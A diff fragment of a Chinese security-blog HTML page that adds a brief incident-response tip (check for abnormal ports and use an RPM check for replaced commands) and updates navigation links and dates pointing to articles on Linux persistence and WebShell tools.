+<p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p>
 
                 
             </div>
@@ -752,7 +596,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/03/30/%E6%BA%AF%E6%BA%90/">http://example.com/2023/03/30/%E6%BA%AF%E6%BA%90/</a>
+                    <a href="http://example.com/2023/04/03/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87/">http://example.com/2023/04/03/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -961,7 +805,7 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/04/03/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/README/">
+                <a href="/2023/04/03/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC7%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81WebShell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/">
                     <div class="card-image">
                         
                         
@@ -998,7 +842,7 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/03/30/%E9%9D%A2%E8%AF%95%E9%A2%98/">
+                <a href="/2023/04/03/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/">
                     <div class="card-image">
                         
                         
@@ -1015,7 +859,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
                             </span>
                         <span class="publish-author">
                             
